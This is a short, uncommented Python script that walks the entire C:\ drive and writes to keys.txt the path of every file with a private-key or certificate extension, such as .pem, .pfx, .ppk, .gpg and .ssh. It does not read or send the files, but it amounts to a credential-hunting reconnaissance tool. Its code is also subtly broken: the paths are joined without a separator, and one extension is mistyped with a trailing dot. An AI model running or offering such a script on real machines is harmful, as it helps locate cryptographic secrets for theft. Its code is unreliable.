import os
import os.path
f = open("keys.txt","w+")
ext=[".key",".pgp", ".gpg", ".ppk.", ".p12", ".pem", ".pfx", ".cer", ".p7b", ".asc",".ssh"]
path = os.walk('c:\\')
for root, directories,files in path:
    for file in files:
        for e in ext:
            if(file.endswith(e)):
                print(root+file,file=f)